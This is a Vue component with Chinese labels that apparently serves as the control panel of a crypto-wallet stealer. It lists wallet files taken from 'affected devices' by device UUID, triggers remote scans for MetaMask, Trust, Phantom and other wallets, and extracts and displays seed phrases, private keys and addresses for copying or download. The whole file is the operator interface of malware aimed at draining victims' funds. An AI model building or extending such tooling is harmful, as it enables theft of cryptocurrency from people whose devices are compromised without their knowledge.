<template>
  <div class="wallets">
    <!-- 统计卡片 -->
    <el-row :gutter="15" class="stats-row">
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #f56c6c;">
              <el-icon size="28"><Wallet /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.total_wallets || 0 }}</div>
              <div class="stat-label">钱包总数</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #e6a23c;">
              <el-icon size="28"><Iphone /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ Object.keys(stats.by_device || {}).length }}</div>
              <div class="stat-label">受影响设备</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #409eff;">
              <el-icon size="28"><Link /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ Object.keys(stats.by_type || {}).length }}</div>
              <div class="stat-label">钱包类型</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #67c23a;">
              <el-icon size="28"><Key /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ mnemonicCount }}</div>
              <div class="stat-label">已解析助记词</div>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <!-- 钱包类型分布 -->
    <el-card v-if="stats.by_type && Object.keys(stats.by_type).length > 0" class="type-distribution">
      <template #header>
        <span>钱包类型分布</span>
      </template>
      <el-row :gutter="10">
        <el-col :span="3" v-for="(count, type) in stats.by_type" :key="type">
          <el-tag :type="getTagType(type)" size="large">
            {{ getWalletName(type) }}: {{ count }}
          </el-tag>
        </el-col>
      </el-row>
    </el-card>

    <!-- 操作工具栏 -->
    <el-card>
      <div class="toolbar">
        <div class="search-bar">
          <el-input v-model="filters.device_uuid" placeholder="设备UUID" style="width: 250px;" />
          <el-select v-model="filters.wallet_type" placeholder="钱包类型" style="width: 180px;">
            <el-option label="全部" value="" />
            <el-option v-for="(info, type) in walletTypes" :key="type" :label="info.name" :value="type" />
          </el-select>
          <el-button type="primary" @click="loadWallets">查询</el-button>
          <el-button @click="resetFilters">重置</el-button>
        </div>
        <div class="action-bar">
          <el-button type="success" @click="showScanDialog">扫描钱包</el-button>
          <el-button type="warning" @click="batchParseMnemonic" :disabled="selectedIds.length === 0">
            批量解析助记词
          </el-button>
          <el-button type="danger" @click="batchDelete" :disabled="selectedIds.length === 0">
            批量删除
          </el-button>
        </div>
      </div>

      <el-table 
        :data="walletsData" 
        border 
        v-loading="loading"
        @selection-change="handleSelectionChange"
      >
        <el-table-column type="selection" width="55" />
        <el-table-column prop="id" label="ID" width="70" />
        <el-table-column prop="device_uuid" label="设备UUID" width="250" show-overflow-tooltip />
        <el-table-column label="钱包类型" width="150">
          <template #default="scope">
            <el-tag :type="getTagType(getWalletType(scope.row))">
              {{ getWalletName(getWalletType(scope.row)) }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column label="区块链" width="120">
          <template #default="scope">
            {{ getWalletChain(getWalletType(scope.row)) }}
          </template>
        </el-table-column>
        <el-table-column prop="path" label="文件路径" show-overflow-tooltip width="200" />
        <el-table-column prop="file_size" label="大小" width="100">
          <template #default="scope">
            {{ formatSize(scope.row.file_size) }}
          </template>
        </el-table-column>
        <el-table-column prop="uploaded_at" label="获取时间" width="180" />
        <el-table-column label="操作" width="280" fixed="right">
          <template #default="scope">
            <el-button size="small" type="primary" @click="parseMnemonic(scope.row)">
              解析助记词
            </el-button>
            <el-button size="small" @click="downloadWallet(scope.row)">下载</el-button>
            <el-button size="small" type="danger" @click="deleteWallet(scope.row)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>

    <!-- 助记词解析对话框 -->
    <el-dialog title="钱包助记词解析" v-model="mnemonicDialogVisible" width="60%">
      <div v-loading="parsing">
        <el-descriptions :column="1" border>
          <el-descriptions-item label="钱包类型">
            <el-tag :type="getTagType(getWalletType(currentWallet))">
              {{ getWalletName(getWalletType(currentWallet)) }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="区块链">
            {{ getWalletChain(getWalletType(currentWallet)) }}
          </el-descriptions-item>
          <el-descriptions-item label="设备UUID">
            {{ currentWallet?.device_uuid }}
          </el-descriptions-item>
          <el-descriptions-item label="文件路径">
            {{ currentWallet?.path }}
          </el-descriptions-item>
          <el-descriptions-item label="助记词" v-if="mnemonicData.mnemonic">
            <div class="mnemonic-box">
              <el-input 
                :model-value="mnemonicData.mnemonic" 
                type="textarea" 
                :rows="3" 
                readonly 
              />
              <el-button size="small" @click="copyMnemonic" style="margin-top: 5px;">
                复制助记词
              </el-button>
            </div>
          </el-descriptions-item>
          <el-descriptions-item label="私钥" v-if="mnemonicData.private_key">
            <el-input 
              :model-value="mnemonicData.private_key" 
              type="textarea" 
              :rows="2" 
              readonly 
            />
          </el-descriptions-item>
          <el-descriptions-item label="钱包地址" v-if="mnemonicData.address">
            <el-input :model-value="mnemonicData.address" readonly />
          </el-descriptions-item>
        </el-descriptions>

        <div v-if="!mnemonicData.mnemonic && !parsing" class="parse-failed">
          <el-alert title="未能自动解析助记词" type="warning" :closable="false">
            <template #default>
              <p>可能原因：</p>
              <ul>
                <li>数据被加密，需要额外解密</li>
                <li>助记词存储在Secure Enclave中</li>
                <li>文件格式不支持自动解析</li>
              </ul>
              <p>建议查看原始数据手动分析</p>
            </template>
          </el-alert>
          <el-button type="primary" @click="showRawData" style="margin-top: 10px;">
            查看原始数据
          </el-button>
        </div>

        <div v-if="showRaw" class="raw-data">
          <h4>原始数据</h4>
          <pre>{{ mnemonicData.raw_content }}</pre>
        </div>
      </div>
    </el-dialog>

    <!-- 扫描对话框 -->
    <el-dialog title="扫描设备钱包" v-model="scanDialogVisible" width="50%">
      <el-form :model="scanForm" label-width="100px">
        <el-form-item label="选择设备">
          <el-select v-model="scanForm.device_uuid" placeholder="请选择设备" style="width: 100%;">
            <el-option 
              v-for="device in devices" 
              :key="device.device_uuid" 
              :label="device.device_uuid" 
              :value="device.device_uuid" 
            />
          </el-select>
        </el-form-item>
        <el-form-item label="钱包类型">
          <el-select v-model="scanForm.wallet_types" multiple placeholder="选择要扫描的钱包类型" style="width: 100%;">
            <el-option 
              v-for="(info, type) in walletTypes" 
              :key="type" 
              :label="info.name" 
              :value="type" 
            />
          </el-select>
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="scanDialogVisible = false">取消</el-button>
        <el-button type="primary" @click="startScan" :loading="scanning">
          开始扫描
        </el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import axios from '../utils/axios'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Wallet, Iphone, Link, Key } from '@element-plus/icons-vue'

const walletsData = ref([])
const loading = ref(false)
const walletTypes = ref({})
const stats = ref({})
const mnemonicCount = ref(0)
const selectedIds = ref([])
const devices = ref([])

const filters = reactive({
  device_uuid: '',
  wallet_type: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

// 助记词解析
const mnemonicDialogVisible = ref(false)
const parsing = ref(false)
const currentWallet = ref(null)
const mnemonicData = reactive({
  mnemonic: '',
  private_key: '',
  address: '',
  raw_content: ''
})
const showRaw = ref(false)

// 扫描
const scanDialogVisible = ref(false)
const scanning = ref(false)
const scanForm = reactive({
  device_uuid: '',
  wallet_types: []
})

function formatSize(size) {
  if (!size) return '-'
  if (size < 1024) return size + ' B'
  if (size < 1024 * 1024) return (size / 1024).toFixed(2) + ' KB'
  return (size / 1024 / 1024).toFixed(2) + ' MB'
}

function getWalletType(row) {
  if (!row.description) return 'unknown'
  const desc = row.description.toLowerCase()
  for (const type of Object.keys(walletTypes.value)) {
    if (desc.includes(type)) return type
  }
  return 'unknown'
}

function getWalletName(type) {
  return walletTypes.value[type]?.name || type
}

function getWalletChain(type) {
  return walletTypes.value[type]?.chain || '-'
}

function getTagType(type) {
  const types = {
    'metamask': 'warning',
    'trust': 'success',
    'coinbase': 'primary',
    'imtoken': 'danger',
    'tokenpocket': 'info',
    'phantom': 'danger'
  }
  return types[type] || 'info'
}

async function loadWalletTypes() {
  try {
    const response = await axios.get('/api/wallets/types')
    walletTypes.value = response.data
  } catch (error) {
    console.error('加载钱包类型失败:', error)
  }
}

async function loadStats() {
  try {
    const response = await axios.get('/api/wallets/stats')
    stats.value = response.data
  } catch (error) {
    console.error('加载统计失败:', error)
  }
}

async function loadWallets() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    if (filters.wallet_type) params.append('wallet_type', filters.wallet_type)
    
    const response = await axios.get(`/api/wallets?${params}`)
    walletsData.value = response.data
    pagination.total = response.data.length
  } catch (error) {
    console.error('加载数据失败:', error)
  } finally {
    loading.value = false
  }
}

async function loadDevices() {
  try {
    const response = await axios.get('/api/devices?limit=100')
    devices.value = response.data
  } catch (error) {
    console.error('加载设备失败:', error)
  }
}

function handleSelectionChange(selection) {
  selectedIds.value = selection.map(item => item.id)
}

async function parseMnemonic(row) {
  currentWallet.value = row
  mnemonicDialogVisible.value = true
  parsing.value = true
  showRaw.value = false
  mnemonicData.mnemonic = ''
  mnemonicData.private_key = ''
  mnemonicData.address = ''
  mnemonicData.raw_content = ''
  
  try {
    const response = await axios.get(`/api/wallets/mnemonic/${row.id}`)
    Object.assign(mnemonicData, response.data)
    if (mnemonicData.mnemonic) {
      mnemonicCount.value++
    }
  } catch (error) {
    ElMessage.error('解析失败: ' + (error.response?.data?.detail || error.message))
  } finally {
    parsing.value = false
  }
}

async function batchParseMnemonic() {
  for (const id of selectedIds.value) {
    const wallet = walletsData.value.find(w => w.id === id)
    if (wallet) {
      await parseMnemonic(wallet)
      mnemonicDialogVisible.value = false
    }
  }
  ElMessage.success(`已解析${selectedIds.value.length}个钱包`)
}

function showRawData() {
  showRaw.value = !showRaw.value
}

function copyMnemonic() {
  navigator.clipboard.writeText(mnemonicData.mnemonic)
  ElMessage.success('助记词已复制到剪贴板')
}

async function downloadWallet(row) {
  try {
    const response = await axios.get(`/api/wallets/${row.id}/download`, { responseType: 'blob' })
    const url = window.URL.createObjectURL(new Blob([response.data]))
    const link = document.createElement('a')
    link.href = url
    link.setAttribute('download', row.path.split('/').pop() || `wallet_${row.id}.dat`)
    document.body.appendChild(link)
    link.click()
    link.remove()
  } catch (error) {
    ElMessage.error('下载失败')
  }
}

async function deleteWallet(row) {
  try {
    await ElMessageBox.confirm('确定要删除这条钱包数据吗？', '提示', { type: 'warning' })
    await axios.delete(`/api/wallets/${row.id}`)
    ElMessage.success('删除成功')
    loadWallets()
    loadStats()
  } catch (error) {
    if (error !== 'cancel') {
      ElMessage.error('删除失败')
    }
  }
}

async function batchDelete() {
  try {
    await ElMessageBox.confirm(`确定要删除选中的${selectedIds.value.length}条数据吗？`, '提示', { type: 'warning' })
    for (const id of selectedIds.value) {
      await axios.delete(`/api/wallets/${id}`)
    }
    ElMessage.success('批量删除成功')
    loadWallets()
    loadStats()
  } catch (error) {
    if (error !== 'cancel') {
      ElMessage.error('删除失败')
    }
  }
}

function showScanDialog() {
  scanForm.device_uuid = ''
  scanForm.wallet_types = []
  loadDevices()
  scanDialogVisible.value = true
}

async function startScan() {
  if (!scanForm.device_uuid) {
    ElMessage.warning('请选择设备')
    return
  }
  
  scanning.value = true
  try {
    const response = await axios.post(`/api/wallets/scan?device_uuid=${scanForm.device_uuid}`)
    ElMessage.success(response.data.message)
    scanDialogVisible.value = false
  } catch (error) {
    ElMessage.error('扫描失败: ' + (error.response?.data?.detail || error.message))
  } finally {
    scanning.value = false
  }
}

function resetFilters() {
  filters.device_uuid = ''
  filters.wallet_type = ''
  loadWallets()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadWallets()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadWallets()
}

onMounted(() => {
  loadWalletTypes()
  loadStats()
  loadWallets()
})
</script>

<style scoped>
.stats-row {
  margin-bottom: 15px;
}

.stat-card {
  display: flex;
  align-items: center;
  gap: 15px;
}

.stat-icon {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
}

.stat-info {
  flex: 1;
}

.stat-value {
  font-size: 24px;
  font-weight: bold;
  color: #333;
}

.stat-label {
  font-size: 14px;
  color: #999;
  margin-top: 5px;
}

.type-distribution {
  margin-bottom: 15px;
}

.toolbar {
  display: flex;
  justify-content: space-between;
  margin-bottom: 15px;
  flex-wrap: wrap;
  gap: 10px;
}

.search-bar, .action-bar {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
}

.mnemonic-box {
  width: 100%;
}

.parse-failed {
  margin-top: 15px;
}

.raw-data {
  margin-top: 15px;
}

.raw-data pre {
  background: #f5f5f5;
  padding: 10px;
  border-radius: 4px;
  max-height: 300px;
  overflow-y: auto;
  white-space: pre-wrap;
  word-break: break-all;
}
</style>
